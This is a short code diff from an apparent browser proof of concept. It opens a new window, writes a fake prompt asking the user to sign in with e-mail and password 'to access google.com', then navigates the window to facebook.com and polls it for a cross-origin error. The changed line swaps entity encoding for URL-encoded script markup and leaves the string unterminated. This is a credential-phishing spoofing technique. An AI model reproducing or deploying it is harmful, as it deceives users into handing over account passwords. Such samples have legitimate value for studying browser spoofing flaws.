@@ -5,7 +5,7 @@
 
   function f() {
     w = window.open("");
-    w.document.write('prompt(&quot;Sign into your account in order to access google.com&quot;, &quot;E-mail / Password&quot;');
+    w.document.write('%3Cscript%3Eprompt(%22Sign%20into%20your%20account%20in%20order%20to%20access%20google.com%22%2C%20%22E-mail%20%2F%20Password');
     w.location = "https://facebook.com";
     i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
   }
